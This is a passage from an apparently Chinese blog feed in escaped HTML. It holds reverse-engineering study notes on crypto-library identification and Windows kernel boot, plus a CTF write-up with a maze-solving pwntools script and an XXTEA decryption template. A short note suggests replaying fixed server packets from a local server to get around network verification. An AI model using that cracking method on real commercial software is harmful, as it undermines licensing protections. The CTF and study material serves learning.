&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;此外，还有微软扩展函数 &lt;code&gt;WSASend&lt;/code&gt; 和 &lt;code&gt;WSARecv&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;破解思路&#34;&gt;破解思路&lt;/h4&gt;
&lt;p&gt;当服务器发送的数据包固定时，可以搭建本地服务器，发送该数据包&lt;/p&gt;
&lt;p&gt;数据包不固定时，需要分析算法&lt;/p&gt;
&lt;h2 id=&#34;加密算法常见加密库接口及其识别&#34;&gt;加密算法——常见加密库接口及其识别&lt;/h2&gt;
&lt;p&gt;可以使用 &lt;code&gt;Flair&lt;/code&gt; 工具制作 IDA sig&lt;/p&gt;
&lt;h3 id=&#34;miracl-大数运算库&#34;&gt;Miracl 大数运算库&lt;/h3&gt;
&lt;p&gt;大数库，支持 RSA、DH 密钥交换、DSA 以及椭圆曲线等&lt;/p&gt;
&lt;p&gt;存储方式：以 $2^{32}$ 进制表示，低位在前，高位在后&lt;/p&gt;
&lt;p&gt;识别方式：&lt;code&gt;MR_IN()&lt;/code&gt; 是错误处理方式，几乎每个函数中都有&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;dword&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ptr&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;ecx&lt;/span&gt;*&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;], &lt;span style=&#34;color:#66d9ef&#34;&gt;yy&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其中，yy 就是 &lt;code&gt;MR_IN()&lt;/code&gt; 的参数，一次可以从 &lt;code&gt;miracl.h&lt;/code&gt; 中找到对应的函数&lt;/p&gt;
&lt;h3 id=&#34;fgint&#34;&gt;FGInt&lt;/h3&gt;
&lt;p&gt;用于 Delphi，可实现常见公钥加密系统&lt;/p&gt;
&lt;p&gt;存储方式：以 $2^{31}$ 进制表示&lt;/p&gt;
&lt;p&gt;识别方式：参数个数以及调用前后的数据变化（黑盒）或者使用  PEiD 的 Krypto ANALyzer 插件&lt;/p&gt;
&lt;h3 id=&#34;freelip&#34;&gt;freeLIP&lt;/h3&gt;
&lt;p&gt;最初用于用于进行 RSA-129 挑战，$2^{30}$ 进制，速度不如 Miracl&lt;/p&gt;
&lt;h3 id=&#34;crypto&#34;&gt;Crypto++&lt;/h3&gt;
&lt;p&gt;实现了大量的加密算法，常用识别方法为 IDA sig，需要熟练掌握加密算法&lt;/p&gt;
&lt;h3 id=&#34;libtomcrypto&#34;&gt;LibTomCrypto&lt;/h3&gt;
&lt;p&gt;包括常见的散列算法、对称算法以及公钥加密算法&lt;/p&gt;
&lt;h3 id=&#34;gmp&#34;&gt;GMP&lt;/h3&gt;
&lt;p&gt;核心采用了汇编语言实现，速度非常快，通常用于实现大整数分解&lt;/p&gt;
&lt;h3 id=&#34;openssl&#34;&gt;OpenSSL&lt;/h3&gt;
&lt;p&gt;用于网安领域，包括一些加密算法的实现，例如 BlowFish、IDEA、DES、CAST，RSA、DSA，MD5、RIPEMD、SHA 等&lt;/p&gt;
&lt;p&gt;可以到 OpenSSL 的 crypto 目录下的加密算法源码中寻找符合条件的函数&lt;/p&gt;
&lt;h3 id=&#34;microsoft-crypto-api&#34;&gt;Microsoft Crypto API&lt;/h3&gt;
&lt;p&gt;可参考 MSDN，IDA、OllyDbg 等软件均可识别&lt;/p&gt;
&lt;h3 id=&#34;ntl&#34;&gt;NTL&lt;/h3&gt;
&lt;p&gt;数论相关，实现有符号的、算术整数的运算，以及向量、矩阵、基于有限域和整数的多项式运算&lt;/p&gt;
&lt;h3 id=&#34;dcp-和-dec&#34;&gt;DCP 和 DEC&lt;/h3&gt;
&lt;p&gt;Delphi 的加密算法库&lt;/p&gt;
&lt;h2 id=&#34;windows内核基础&#34;&gt;Windows内核基础&lt;/h2&gt;
&lt;h3 id=&#34;内核理论基础&#34;&gt;内核理论基础&lt;/h3&gt;
&lt;h4 id=&#34;权限级别&#34;&gt;权限级别&lt;/h4&gt;
&lt;p&gt;CPU将权限分为 &lt;code&gt;R0~R3&lt;/code&gt; 其中 &lt;code&gt;R0&lt;/code&gt; 权限最高，运行内核，&lt;code&gt;R1&lt;/code&gt; 和 &lt;code&gt;R2&lt;/code&gt; 运行驱动程序，&lt;code&gt;R3&lt;/code&gt; 权限最低，运行应用程序&lt;/p&gt;
&lt;p&gt;操作系统（Windows, Linux）为方便，将内核和驱动程序（内核态）运行在了 &lt;code&gt;R0&lt;/code&gt; 层，将应用程序（用户态）运行在 &lt;code&gt;R3&lt;/code&gt; 层，而没有使用 &lt;code&gt;R1&lt;/code&gt; 和 &lt;code&gt;R2&lt;/code&gt; ，因此 &lt;code&gt;AMD64&lt;/code&gt; 取消了 &lt;code&gt;R1&lt;/code&gt; 和 &lt;code&gt;R2&lt;/code&gt; 层&lt;/p&gt;
&lt;h4 id=&#34;内存空间布局&#34;&gt;内存空间布局&lt;/h4&gt;
&lt;p&gt;32位系统虚拟内存：&lt;/p&gt;
&lt;p&gt;2GB内核空间，64KB的NULL空间和非法空间，其余为进程空间&lt;/p&gt;
&lt;p&gt;64位系统虚拟内存：&lt;/p&gt;
&lt;p&gt;Windows实际为44位（16TB），Linux实际为48位（256TB）&lt;/p&gt;
&lt;p&gt;存在大量空洞&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;+-+-+-+-+-+-+-+-+-+-+-+-+ 0x000000
|                       |
+-+-+-+-+-+-+-+-+-+-+-+-+ 0x400000
|          text         |
+-+-+-+-+-+-+-+-+-+-+-+-+
|          data         |
+-+-+-+-+-+-+-+-+-+-+-+-+
|          BSS          |
+-+-+-+-+-+-+-+-+-+-+-+-+
|          heap         |
+-+-+-+-+-+-+-+-+-+-+-+-+ 向下增长
|                       |
|          hole         |
|                       |
+-+-+-+-+-+-+-+-+-+-+-+-+ 0x00002AAAAAAAA000
|      内存映射区域      |
+-+-+-+-+-+-+-+-+-+-+-+-+ 向下增长
|                       |
|          hole         |
|                       |
+-+-+-+-+-+-+-+-+-+-+-+-+ 向上增长
|         stack         |
+-+-+-+-+-+-+-+-+-+-+-+-+ 0x00007FFFFFFFF000=TASK_SIZE
|       未定义区域       |
+-+-+-+-+-+-+-+-+-+-+-+-+ 0xFFFF800000000000
|        内核空间        |
+-+-+-+-+-+-+-+-+-+-+-+-+
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;windows内核启动过程&#34;&gt;Windows内核启动过程&lt;/h4&gt;
&lt;p&gt;BIOS+MBR+Windows&lt;/p&gt;
&lt;h5 id=&#34;启动自检&#34;&gt;启动自检&lt;/h5&gt;
&lt;p&gt;从BIOS中载入必要指令，进行硬件初始化检查，并显示信息&lt;/p&gt;
&lt;h5 id=&#34;初始化启动&#34;&gt;初始化启动&lt;/h5&gt;
&lt;p&gt;根据CMOS设置，BIOS加载启动盘，将引导代码载入内存，由MBR执行启动过程。启动代码搜索MBR的分区表，找到活动分区，将第一个扇区的引导代码载入内存，检测系统并查找启动管理器。过去为 &lt;code&gt;ntldr&lt;/code&gt; ，Windows7开始使用 &lt;code&gt;Bootmgr&lt;/code&gt;作为启动管理。&lt;/p&gt;
&lt;h5 id=&#34;boot加载&#34;&gt;Boot加载&lt;/h5&gt;
&lt;p&gt;对启动管理器进行设置&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;设置内存模式：32位系统+32位CPU，设置为32位内存模式；64位系统+64位CPU，设置为64位内存模式&lt;/li&gt;
&lt;li&gt;启动一个简单的文件系统：定位 &lt;code&gt;boot.ini&lt;/code&gt;，&lt;code&gt;ntoskrnl&lt;/code&gt;，&lt;code&gt;Hal&lt;/code&gt; 等启动文件&lt;/li&gt;
&lt;li&gt;读取 &lt;code&gt;boot.ini&lt;/code&gt; 文件&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;检测和配置硬件&#34;&gt;检测和配置硬件&lt;/h5&gt;
&lt;p&gt;检查和配置硬件设备，如系统固件、总线、适配器、键盘磁盘等等&lt;/p&gt;
&lt;h5 id=&#34;内核加载&#34;&gt;内核加载&lt;/h5&gt;
&lt;p&gt;启动管理器先加载内核 &lt;code&gt;Ntoskrnl.exe&lt;/code&gt; 和硬件抽象层 &lt;code&gt;HAL&lt;/code&gt;。&lt;code&gt;HAL&lt;/code&gt; 会对硬件底层进行隔离，为操作系统提供统一的API。&lt;/p&gt;
&lt;p&gt;随后根据注册表 &lt;code&gt;HKEY_LOCAL_MACHINE\System\CurrentControlSet&lt;/code&gt; 来加载驱动程序&lt;/p&gt;
&lt;p&gt;注册表中的 &lt;code&gt;Start&lt;/code&gt; 键表示了启动顺序&lt;/p&gt;
&lt;ol start=&#34;0&#34;&gt;
&lt;li&gt;&lt;code&gt;SERVICE_BOOT_START&lt;/code&gt;， 内核初始化时，与系统核心相关的重要驱动程序&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SERVICE_SYSTEM_START&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SERVICE_AUTO_START&lt;/code&gt;，登陆界面开始&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SERVICE_DEMAND_START&lt;/code&gt;，需要时手动加载&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SERVICE_DISABLED&lt;/code&gt;，禁止加载&lt;/li&gt;
&lt;/ol&gt;
&lt;h5 id=&#34;windows会话管理启动&#34;&gt;Windows会话管理启动&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;smss.exe&lt;/code&gt; 是Windows中第一个创建的用户模式进程，主要用于&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;创建系统环境变量&lt;/li&gt;
&lt;li&gt;加载 &lt;code&gt;win32k.sys&lt;/code&gt;，Windows子系统的内核模式部分&lt;/li&gt;
&lt;li&gt;启动 &lt;code&gt;csrss.exe&lt;/code&gt;，Windows子系统的用户模式部分&lt;/li&gt;
&lt;li&gt;启动 &lt;code&gt;winlogon.exe&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;创建虚拟内存页面文件&lt;/li&gt;
&lt;li&gt;执行重启前未完成的重命名工作&lt;/li&gt;
&lt;/ul&gt;</description>
        </item>
        <item>
        <title>dfjk 2021 RE</title>
        <link>/post/2021dfjk-re/</link>
        <pubDate>Wed, 04 Aug 2021 13:48:58 +0000</pubDate>
        
        <guid>/post/2021dfjk-re/</guid>
        <description>&lt;ul&gt;
&lt;li&gt;RE1：迷宫&lt;/li&gt;
&lt;li&gt;RE2：so层&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最后一个好像是php？告辞&lt;/p&gt;
&lt;h2 id=&#34;re1&#34;&gt;RE1&lt;/h2&gt;
&lt;p&gt;程序逻辑很简单，就是一个迷宫，迷宫的每一个位置写成了一个函数，一开始想手动推一下试试，结果发现有的格子可能有多条路径，然后想反着推，然后发现有相同的问题&amp;hellip;&lt;/p&gt;
&lt;p&gt;考虑写自动化脚本，一开始想试试angr，同样有很多问题，想用idaapi又只能现查各种api&lt;/p&gt;
&lt;p&gt;后来在手动执行的时候，发现错误输入和正确输入之间的区别是反馈不同，而且走错路径的话不需要退出，直接原路返回就行，于是考虑直接用pwntools模拟手动执行&lt;/p&gt;
&lt;p&gt;直接简单回溯&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys

sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setrecursionlimit(&lt;span style=&#34;color:#ae81ff&#34;&gt;20000&lt;/span&gt;)

&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

success &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
    &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Just do it&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;GOGOGO&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Wuhu~!&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Wuhu&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;You are so good&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Nice.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Yeah~~&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Yeah~~~&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Let&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;s go.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Never stop&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;So smart&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;,
]

p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./maze&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# solvepath = &amp;#34;SSSSSSSSSDDDDDDWWWWAAWWAASSSSD&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# context(os=&amp;#39;linux&amp;#39;, arch=&amp;#39;amd64&amp;#39;, log_level=&amp;#39;debug&amp;#39;)&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# solveend = &amp;#34;AASSDDSSSSDDS&amp;#34;&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# solvepath = &amp;#39;S&amp;#39; * 8&lt;/span&gt;
solvepath &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;S&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;

direct &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;W&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;D&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;S&amp;#39;&lt;/span&gt;]

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;You can only go south.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; solvepath:
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(i)
    print (p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline(), i)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;dfs&lt;/span&gt;():
    &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; solvepath
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; cur &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; direct:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; direct&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;index(solvepath[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; direct&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;index(cur) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:
            p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(cur)
            rev &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()
            &lt;span style=&#34;color:#75715e&#34;&gt;# print (rev, cur)&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; rev &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; success:
                solvepath &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; cur
                &lt;span style=&#34;color:#75715e&#34;&gt;# print (solvepath)&lt;/span&gt;
                dfs()
                &lt;span style=&#34;color:#75715e&#34;&gt;# print (direct[3 - direct.index(solvepath[-1])])&lt;/span&gt;
                p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(direct[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; direct&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;index(solvepath[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])])
                solvepath &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; solvepath[:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
                p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()
            &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Good Job.&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; rev:
                print (solvepath &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; cur)
                exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)

dfs()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;运行结果拿去算个md5就行&lt;/p&gt;
&lt;h2 id=&#34;re2&#34;&gt;RE2&lt;/h2&gt;
&lt;p&gt;这题才是传统的逆向啊，为什么做的人反而比第一题少&amp;hellip;&lt;/p&gt;
&lt;p&gt;看一下jeb，发现加密在so层，直接ida看so层&lt;/p&gt;
&lt;p&gt;发现先进行了一个RC4，然后是一个XXTEA&lt;/p&gt;
&lt;p&gt;直接解密&lt;/p&gt;
&lt;p&gt;解密代码来自 &lt;a class=&#34;link&#34; href=&#34;https://newbiereer.github.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;NewBieReer&lt;/a&gt; 师傅&lt;/p&gt;
&lt;p&gt;先上XXTEA模板&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;  &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdint.h&amp;gt;  &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define DELTA 0x9e3779b9  
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define MX (((z&amp;gt;&amp;gt;5^y&amp;lt;&amp;lt;2) + (y&amp;gt;&amp;gt;3^z&amp;lt;&amp;lt;4)) ^ ((sum^y) + (key[(p&amp;amp;3)^e] ^ z)))  
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;btea&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; n, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; key[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]) { 
        &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; y, z, sum;  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; p, rounds, e;  
        rounds &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;n;  &lt;span style=&#34;color:#75715e&#34;&gt;//12        52/6 = 8    n
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        sum &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rounds&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DELTA;  
        y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;];  
        &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; {  
            e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (sum &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;;  
            &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (p&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;n&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; p&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; p&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;) {  
                z &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v[p&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];  
                y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v[p] &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; MX;  
            }  
            z &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v[n&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];  
            y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; MX;  
            sum &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; DELTA;  
        }  
        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;rounds);  
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(){
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; v[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#ae81ff&#34;&gt;0x68E5973E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0C20C7367&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x98AFD41B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFE4B9DE2&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1A5B60B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3D36D646&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDBCC7BAF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA0414F00&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x762CE71A&lt;/span&gt;
    };
